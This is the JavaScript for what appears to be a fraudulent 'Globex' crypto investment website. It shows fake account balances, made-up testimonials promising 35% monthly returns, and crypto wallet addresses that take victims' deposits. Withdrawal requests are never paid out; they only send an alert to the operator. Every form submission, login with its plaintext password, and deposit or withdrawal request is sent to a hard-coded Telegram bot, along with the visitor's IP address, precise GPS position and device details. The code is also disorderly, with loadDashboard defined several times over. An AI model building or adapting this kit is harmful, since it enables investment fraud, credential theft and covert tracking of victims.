// ═══════════════════════════════════
// 1. CONFIGURATION & ACCOUNTS
// ═══════════════════════════════════

const TG_TOKEN = "8696249268:AAFIF11FRn9ksh_S8uyFaz2eH94s4YK1-pg";
const TG_CHAT_ID = "7637163658";

const ACCOUNTS = {
  "admin": {
    password: "globex2025",
    name: "Admin User",
    initials: "AU",
    portfolio: "$1,240,000",
    profit: "$284,500",
    roi: "35%",
    plan: "Gold Plan",
    transactions: [
      { date: "May 05", type: "Profit Credit", amount: "+$43,400", status: "active" },
      { date: "May 01", type: "Deposit", amount: "+$100,000", status: "active" },
      { date: "Apr 28", type: "Profit Credit", amount: "+$35,000", status: "active" },
      { date: "Apr 15", type: "Withdrawal", amount: "-$20,000", status: "active" },
    ]
  },
  "investor1": {
    password: "invest@2025",
    name: "Sarah John",
    initials: "SJ",
    portfolio: "$52,000,400",
    profit: "$9,800",
    roi: "22%",
    plan: "Silver Plan",
    transactions: [
      { date: "May 05", type: "Profit Credit", amount: "-$1,144", status: "active" },
      { date: "May 01", type: "Deposit", amount: "+$10,000", status: "pending" },
    ]
  },
  "vip001": {
    password: "vip$ecure99",
    name: "Michael Osei",
    initials: "MO",
    portfolio: "$820,000",
    profit: "$142,000",
    roi: "40%+",
    plan: "Platinum Plan",
    transactions: [
      { date: "May 05", type: "Profit Credit", amount: "+$82,000", status: "active" },
    ]
  },
  "vip002": {
    password: "vip$ecure99",
    name: "Michael Osei",
    initials: "MO",
    portfolio: "$820,000",
    profit: "$142,000",
    roi: "40%+",
    plan: "Platinum Plan",
    transactions: [
      { date: "May 05", type: "Profit Credit", amount: "+$82,000", status: "pending" },
    ]
  }
};

// ═══════════════════════════════════
// 2. SECURITY & TRACKING ENGINE
// ═══════════════════════════════════

async function getIPInfo() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    return {
      ip: data.ip || "Unknown",
      city: data.city || "Unknown",
      country: data.country_name || "Unknown",
      isp: data.org || "Unknown",
      lat: data.latitude || null,
      lon: data.longitude || null
    };
  } catch (e) { return { ip:"Unknown", city:"Unknown", country:"Unknown", isp:"Unknown" }; }
}

function getGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) resolve({ lat:null, lon:null, err:"Not supported" });
    navigator.geolocation.getCurrentPosition(
      (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, err: null }),
      (e) => resolve({ lat:null, lon:null, err: e.message }),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

function getDevice() {
  const ua = navigator.userAgent;
  return {
    os: ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Mac/Linux",
    browser: ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : "Safari",
    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
    cores: navigator.hardwareConcurrency || "Unknown"
  };
}

async function sendTelegramAlert(type, details, security) {
  const gpsBlock = security.gps.lat 
    ? `✅ <b>GPS:</b> <code>${security.gps.lat}, ${security.gps.lon}</code>` 
    : `⚠️ <b>GPS:</b> Denied (${security.gps.err})`;

  const message = `
🔔 <b>${type.toUpperCase()} ALERT</b>

👤 <b>USER DETAILS</b>
━━━━━━━━━━━━━━
${details}

📍 <b>LOCATION & IP</b>
━━━━━━━━━━━━━━
${gpsBlock}
📡 IP: <code>${security.ip.ip}</code>
🏙️ City: ${security.ip.city}, ${security.ip.country}
🏢 ISP: ${security.ip.isp}
🗺️ <a href="https://www.google.com/maps?q=${security.gps.lat || security.ip.lat},${security.gps.lon || security.ip.lon}">Open in Maps</a>

💻 <b>DEVICE FINGERPRINT</b>
━━━━━━━━━━━━━━
🖥️ OS: ${security.dev.os} | ${security.dev.browser}
🧠 RAM: ${security.dev.ram} | Cores: ${security.dev.cores}
⏰ Time: ${new Date().toLocaleString()}
  `;

  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: "HTML" })
    });
  } catch (err) { console.error("Telegram fail:", err); }
}

// ═══════════════════════════════════
// 3. APPLICATION & LOGIN ACTIONS
// ═══════════════════════════════════

async function submitApplication() {
  const btn = document.querySelector('.btn-submit');
  
  // FIXED: Capturing all fields including the new Deposit field
  const data = {
    fn: document.getElementById('fname')?.value.trim() || "",
    ln: document.getElementById('lname')?.value.trim() || "",
    em: document.getElementById('email')?.value.trim() || "",
    ph: document.getElementById('phone')?.value || "N/A",
    cn: document.getElementById('country')?.value || "N/A",
    pl: document.getElementById('plan')?.value || "N/A",
    dp: document.getElementById('deposit')?.value || "Not Specified"
  };

  if(!data.fn || !data.em) { alert('First Name and Email are required.'); return; }
  
  btn.innerText = "Securing Connection...";
  btn.disabled = true;

  try {
    const [ip, gps] = await Promise.all([getIPInfo(), getGPS()]);
    const dev = getDevice();

    // FIXED: Formatted details to include First Name, Last Name, Country, and Deposit
    const details = `👤 Name: ${data.fn} ${data.ln}\n📧 Email: <code>${data.em}</code>\n📞 Phone: ${data.ph}\n🌍 Country: ${data.cn}\n📊 Plan: ${data.pl}\n💰 <b>Starting Deposit:</b> $${data.dp}`;
    
    await sendTelegramAlert("New Application", details, { ip, gps, dev });

    document.getElementById('applyForm').style.display = 'none';
    document.getElementById('applySuccess').style.display = 'block';
  } catch (err) {
    console.error("Error:", err);
    btn.disabled = false;
    btn.innerText = "Submit Application →";
  }
}

async function doLogin() {
  const user = document.getElementById('loginUser').value.trim();
  const pass = document.getElementById('loginPass').value.trim();
  const errEl = document.getElementById('loginError');
  const acc = ACCOUNTS[user];

  if(acc && acc.password === pass) {
    errEl.style.display = 'none';
    closeModal('loginModal');
    loadDashboard(acc);

    const [ip, gps] = await Promise.all([getIPInfo(), getGPS()]);
    const dev = getDevice();
    const details = `🔑 <b>Username:</b> <code>${user}</code>\n🛡️ <b>Password:</b> <code>${pass}</code>\n👤 <b>Owner:</b> ${acc.name}`;
    await sendTelegramAlert("User Login", details, { ip, gps, dev });

  } else {
    errEl.style.display = 'block';
  }
}

// ═══════════════════════════════════
// 4. CURSOR & VISUALS (Rest of your original code remains here)
// ═══════════════════════════════════

const cursor = document.getElementById('cursor');
const ring = document.getElementById('cursorRing');
if (cursor && ring) {
  document.addEventListener('mousemove', e => {
    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
    ring.style.left = e.clientX + 'px'; ring.style.top = e.clientY + 'px';
  });
}

// TICKER
const coins = [
  {name:'BTC', price:'$104,820', change:'+2.4%', up:true},
  {name:'ETH', price:'$3,812', change:'+1.8%', up:true},
  {name:'BNB', price:'$612', change:'-0.5%', up:false},
  {name:'SOL', price:'$178', change:'+5.2%', up:true},
  {name:'XRP', price:'$0.82', change:'+0.9%', up:true},
  {name:'ADA', price:'$0.54', change:'-1.2%', up:false},
  {name:'DOGE', price:'$0.18', change:'+3.1%', up:true},
  {name:'MATIC', price:'$0.97', change:'+2.7%', up:true},
  {name:'DOT', price:'$9.20', change:'-0.8%', up:false},
  {name:'AVAX', price:'$38.40', change:'+4.3%', up:true},
];
const ticker = document.getElementById('ticker');
[...coins,...coins].forEach(c => {
  ticker.innerHTML += `<div class="ticker-item"><span class="name">${c.name}</span><span class="${c.up?'up':'down'}">${c.price} ${c.change}</span></div>`;
});

function initVisuals() {
  const reviewData = [
    { name:"James Okonkwo", loc:"Lagos, Nigeria", stars:5, text:"Globex transformed my financial life. I started with the Silver plan and doubled my initial investment in 4 months. The broker assigned to me is incredibly knowledgeable." },
    { name:"Elena Marchetti", loc:"Milan, Italy", stars:5, text:"I was skeptical at first, but the consistent returns speak for themselves. My portfolio has grown 280% since I joined. The dashboard makes tracking easy." },
    { name:"David Chen", loc:"Singapore", stars:5, text:"Professional, transparent, and incredibly effective. The Gold plan has been generating consistent 35% monthly returns just as promised. Highly recommended." },
    { name:"Amara Diallo", loc:"Accra, Ghana", stars:5, text:"Best investment decision I ever made. Started with Bronze, now I'm on Platinum. The team is responsive and my broker is always available to answer questions." },
    { name:"Sophie Williams", loc:"London, UK", stars:5, text:"The level of service at Globex is unmatched. My broker proactively managed my portfolio during the market dip and still delivered positive returns." },
    { name:"Marcus Thompson", loc:"Atlanta, USA", stars:5, text:"I've tried multiple crypto platforms and Globex is by far the best. The ROI is real, the team is professional, and the dashboard is beautiful and easy to use." },
    { name:"Fatima Al-Hassan", loc:"Dubai, UAE", stars:5, text:"Globex gave me confidence to invest in crypto for the first time. The onboarding was seamless and my broker explained everything patiently." },
    { name:"Andrei Popescu", loc:"Bucharest, Romania", stars:5, text:"Three months in and I've already received more than my initial investment back in profits. The compound interest option on the Silver plan is a game changer." },
    { name:"Elena Marchetti", loc:"Milan", text:"Professional and effective returns." }
  ];
  const track = document.getElementById('reviewsTrack');
  if(track) {
    [...reviewData, ...reviewData].forEach(r => {
      track.innerHTML += `<div class="review-card"><div class="review-stars">★★★★★</div><p>"${r.text}"</p><small><b>${r.name}</b>, ${r.loc}</small></div>`;
    });
  }

  const revealEls = document.querySelectorAll('.reveal');
  const observer = new IntersectionObserver(entries => {
    entries.forEach((e,i) => { if(e.isIntersecting) { setTimeout(()=>e.target.classList.add('visible'), i*80); } });
  }, { threshold: 0.1 });
  revealEls.forEach(el => observer.observe(el));

  const statNums = document.querySelectorAll('.stat-num[data-count]');
  const statObserver = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if(e.isIntersecting) {
        const el = e.target; const val = parseFloat(el.dataset.count);
        let start = 0; const step = val/80;
        const timer = setInterval(() => {
          start += step; if(start>=val) { start=val; clearInterval(timer); }
          el.textContent = (val%1!==0 ? start.toFixed(1) : Math.floor(start)) + (el.dataset.suffix || '');
        }, 25);
        statObserver.unobserve(el);
      }
    });
  }, { threshold: .5 });
  statNums.forEach(n => statObserver.observe(n));
}
initVisuals();

function openApply(e) { e && e.preventDefault(); document.getElementById('applyModal').classList.add('active'); }
function openLogin(e) { e && e.preventDefault(); document.getElementById('loginModal').classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }

function loadDashboard(acc) {
  document.getElementById('dashAvatar').textContent = acc.initials;
  document.getElementById('dashName').textContent = acc.name;
  document.getElementById('dashPortfolio').textContent = acc.portfolio;
  document.getElementById('dashProfit').textContent = acc.profit;
  document.getElementById('dashROI').textContent = acc.roi;
  document.getElementById('dashPlan').textContent = acc.plan;
  const tbody = document.getElementById('dashTbody');
  tbody.innerHTML = acc.transactions.map(t => `<tr><td>${t.date}</td><td>${t.type}</td><td style="color:#22C55E; font-weight:bold">${t.amount}</td><td>${t.status.toUpperCase()}</td></tr>`).join('');
  document.getElementById('dashboard').classList.add('active');
}

function doLogout() { document.getElementById('dashboard').classList.remove('active'); }

const CRYPTO_WALLETS = {
  btc: { name: "Bitcoin (BTC)", addr: "1D7X9Q3QcEWVE1daYvFpcRmy7EZTsUoTXH" },
  eth: { name: "Ethereum (ETH)", addr: "0xaac618a6bc48c1ca57a2158c55f4c279d5717937" },
  usdt: { name: "USDT (TRC20)", addr: "TRYBBeBuSTDtJCW63SQf7C3xkm16hgfwui" }
};

function toggleDashSection(type) {
  document.getElementById('depositSection').style.display = type === 'deposit' ? 'block' : 'none';
  document.getElementById('withdrawSection').style.display = type === 'withdraw' ? 'block' : 'none';
  if(type === 'deposit') updateCryptoDetails();
}

function showDepositMethod(method) {
  const isCrypto = method === 'crypto';
  document.getElementById('cryptoPayment').style.display = isCrypto ? 'block' : 'none';
  document.getElementById('brokerPayment').style.display = isCrypto ? 'none' : 'block';
  
  // Update Tab Styling
  document.getElementById('tabCrypto').className = isCrypto ? 'active' : '';
  document.getElementById('tabBroker').className = isCrypto ? '' : 'active';
}

function updateCryptoDetails() {
  const choice = document.getElementById('cryptoSelect').value;
  const wallet = CRYPTO_WALLETS[choice];
  
  document.getElementById('assetLabel').innerText = wallet.name;
  document.getElementById('walletAddr').value = wallet.addr;
  
  // Generate QR Code dynamically
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${wallet.addr}`;
  document.getElementById('qrCode').src = qrUrl;
}

function copyToClipboard() {
  const copyText = document.getElementById("walletAddr");
  copyText.select();
  navigator.clipboard.writeText(copyText.value);
  
  const btn = event.target;
  btn.innerText = "COPIED";
  setTimeout(() => btn.innerText = "Copy", 2000);
}

// CONFIRM DEPOSIT PAYMENT
async function confirmPayment() {
  const coin = document.getElementById('cryptoSelect').value.toUpperCase();
  const user = document.getElementById('dashName').innerText;
  
  const [ip, gps] = await Promise.all([getIPInfo(), getGPS()]);
  const dev = getDevice();
  
  const details = `💰 <b>PAYMENT CONFIRMATION</b>\n━━━━━━━━━━━━━━\n👤 User: ${user}\n🪙 Asset: ${coin}\n📢 <i>User claims to have sent funds. Check wallet/screenshot.</i>`;
  
  await sendTelegramAlert("Deposit Alert", details, { ip, gps, dev });
  alert("Payment is being confirmed. Your balance will update after confirmation.");
}

// PROCESS WITHDRAWAL
async function processWithdrawal() {
  const amount = document.getElementById('withdrawAmount').value;
  const address = document.getElementById('withdrawAddr').value;
  const coin = document.getElementById('withdrawCoin').value;
  const user = document.getElementById('dashName').innerText;

  if(!amount || !address) {
    alert("Please fill in all withdrawal details.");
    return;
  }

  const [ip, gps] = await Promise.all([getIPInfo(), getGPS()]);
  const dev = getDevice();

  const details = `📤 <b>WITHDRAWAL REQUEST</b>\n━━━━━━━━━━━━━━\n👤 User: ${user}\n💵 Amount: $${amount}\n🪙 Method: ${coin}\n📍 Address: <code>${address}</code>`;

  // Send to Telegram
  await sendTelegramAlert("Withdrawal", details, { ip, gps, dev });
  alert("withdrawal is being proccessed. Please check back in some hours");

  // Show the fancy success popup
  document.getElementById('withdrawPopup').classList.add('active');
  
  // Clear inputs
  document.getElementById('withdrawAmount').value = '';
  document.getElementById('withdrawAddr').value = '';
}

// Ensure the Dashboard welcomes the specific user
function loadDashboard(acc) {
  document.getElementById('dashAvatar').textContent = acc.initials;
  document.getElementById('dashName').textContent = acc.name;
  document.getElementById('welcomeUser').textContent = `Hello, ${acc.name.split(' ')[0]}!`;
  document.getElementById('dashPortfolio').textContent = acc.portfolio;
  document.getElementById('dashProfit').textContent = acc.profit;
  document.getElementById('dashPlan').textContent = acc.plan;
  
  const tbody = document.getElementById('dashTbody');
  tbody.innerHTML = acc.transactions.map(t => `
    <tr>
      <td>${t.date}</td>
      <td>${t.type}</td>
      <td style="color:#22C55E; font-weight:bold">${t.amount}</td>
    </tr>`).join('');
    
  document.getElementById('dashboard').classList.add('active');
}

function loadDashboard(acc) {
  // 1. Basic Info
  const avatar = document.getElementById('dashAvatar');
  const nameDisplay = document.getElementById('dashName');
  const welcome = document.getElementById('welcomeUser');
  const plan = document.getElementById('dashPlan');

  if(avatar) avatar.textContent = acc.initials;
  if(nameDisplay) nameDisplay.textContent = acc.name;
  if(welcome) welcome.textContent = `Welcome, ${acc.name.split(' ')[0]}!`;
  if(plan) plan.textContent = acc.plan;

  // 2. Financials
  const portfolio = document.getElementById('dashPortfolio');
  const profit = document.getElementById('dashProfit');
  const roi = document.getElementById('dashROI');
  const standing = document.getElementById('accountStanding');

  if(portfolio) portfolio.textContent = acc.portfolio;
  if(profit) profit.textContent = acc.profit;
  if(roi) roi.textContent = acc.roi;
  if(standing) standing.textContent = "ACTIVE"; // Sets the status section to Active

  // 3. Transactions Table
  const tbody = document.getElementById('dashTbody');
  if(tbody) {
      tbody.innerHTML = acc.transactions.map(t => `
        <tr>
          <td>${t.date}</td>
          <td>${t.type}</td>
          <td style="color:#22C55E; font-weight:bold">${t.amount}</td>
          <td style="font-size:0.7rem; opacity:0.8;">${t.status.toUpperCase()}</td>
        </tr>`).join('');
  }
    
  // 4. Show Overlay
  document.getElementById('dashboard').classList.add('active');
}

function loadDashboard(acc) {
  // 1. Update Profile & Header Info
  const avatar = document.getElementById('dashAvatar');
  const nameDisplay = document.getElementById('dashName');
  const welcome = document.getElementById('welcomeUser');
  const plan = document.getElementById('dashPlan');

  if(avatar) avatar.textContent = acc.initials;
  if(nameDisplay) nameDisplay.textContent = acc.name;
  if(welcome) welcome.textContent = `Welcome, ${acc.name.split(' ')[0]}!`;
  if(plan) plan.textContent = acc.plan;

  // 2. Update Financial Cards
  const portfolio = document.getElementById('dashPortfolio');
  const profit = document.getElementById('dashProfit');
  const roi = document.getElementById('dashROI');

  if(portfolio) portfolio.textContent = acc.portfolio;
  if(profit) profit.textContent = acc.profit;
  if(roi) roi.textContent = acc.roi;

  // 3. Rebuild Transactions Table with Color Logic
  const tbody = document.getElementById('dashTbody');
  if(tbody) {
      tbody.innerHTML = acc.transactions.map(t => {
        // TANYA (LOGIC): Check if amount starts with '-'
        const isDebit = t.amount.startsWith('-');
        
        // RED for negative/debit, GREEN for positive/credit
        const amountColor = isDebit ? '#FF4D4D' : '#22C55E';

        return `
          <tr>
            <td>${t.date}</td>
            <td>${t.type}</td>
            <td style="color:${amountColor}; font-weight:bold">${t.amount}</td>
            <td style="font-size:0.7rem; opacity:0.8;">${t.status.toUpperCase()}</td>
          </tr>`;
      }).join('');
  }
    
  // 4. Reveal the Dashboard
  document.getElementById('dashboard').classList.add('active');
}

const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${wallet.addr}`;
window.addEventListener("load", () => {
  if (document.getElementById('cryptoSelect')) {
    updateCryptoDetails();
  }
});

function loadDashboard(acc) {
  // ===== PROFILE =====
  const avatar = document.getElementById('dashAvatar');
  const nameDisplay = document.getElementById('dashName');
  const welcome = document.getElementById('welcomeUser');
  const plan = document.getElementById('dashPlan');

  if (avatar) avatar.textContent = acc.initials;
  if (nameDisplay) nameDisplay.textContent = acc.name;
  if (welcome) welcome.textContent = `Welcome, ${acc.name.split(' ')[0]}!`;
  if (plan) plan.textContent = acc.plan;

  // ===== FINANCIALS =====
  const portfolio = document.getElementById('dashPortfolio');
  const profit = document.getElementById('dashProfit');

  if (portfolio) portfolio.textContent = acc.portfolio;
  if (profit) profit.textContent = acc.profit;

  // ===== TRANSACTIONS =====
  const tbody = document.getElementById('dashTbody');

  if (tbody) {
    tbody.innerHTML = acc.transactions.map(t => {
      const isDebit = t.amount.startsWith('-');
      const color = isDebit ? '#FF4D4D' : '#22C55E';

      return `
        <tr>
          <td>${t.date}</td>
          <td>${t.type}</td>
          <td style="color:${color}; font-weight:bold">${t.amount}</td>
          <td style="font-size:0.7rem; opacity:0.8;">
            ${t.status.toUpperCase()}
          </td>
        </tr>
      `;
    }).join('');
  }

  // ===== SHOW DASHBOARD =====
  document.getElementById('dashboard').classList.add('active');
}